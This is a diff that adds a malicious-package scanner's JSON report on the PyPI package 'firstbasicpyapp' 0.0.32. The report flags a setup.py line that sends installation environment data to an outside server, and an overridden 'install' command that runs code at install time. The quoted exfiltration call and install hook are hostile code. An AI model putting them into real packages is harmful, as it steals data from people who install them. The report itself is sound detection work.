@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:9",
+                "code": "        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation from \" +env)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(\n  name='firstbasicpyapp',\n  version='0.0.32',\n  description='A very basic firstbasicpyapp!',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/firstbasicpyapp-0.0.32"
+}
